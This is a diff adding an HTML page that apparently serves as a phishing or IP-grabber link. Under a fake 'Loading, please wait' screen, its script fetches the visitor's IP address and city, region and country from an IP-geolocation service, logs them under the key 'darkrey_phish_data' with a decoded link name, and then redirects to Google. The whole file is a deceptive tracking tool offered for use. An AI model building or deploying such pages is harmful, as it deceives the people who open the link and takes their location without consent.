@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .loading { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #f00; border-top-color: #0f0; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loading"><div class="spinner"></div><p>Loading, please wait...</p></div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        let linkName = urlParams.get('id');
+        if(linkName) { try { linkName = atob(linkName); } catch(e) { linkName = linkName || 'Tanpa nama'; } } else { linkName = 'Tanpa nama'; }
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                const location = `${data.city || '?'}, ${data.region || '?'}, ${data.country_name || '?'}`;
+                const phishData = JSON.parse(localStorage.getItem('darkrey_phish_data') || '[]');
+                phishData.unshift({ ip: ip, location: location, linkName: linkName, timestamp: Date.now() });
+                localStorage.setItem('darkrey_phish_data', JSON.stringify(phishData));
+                window.location.href = 'https://www.google.com';
+            })
+            .catch(() => { window.location.href = 'https://www.google.com'; });
+    </script>
+</body>
+</html>
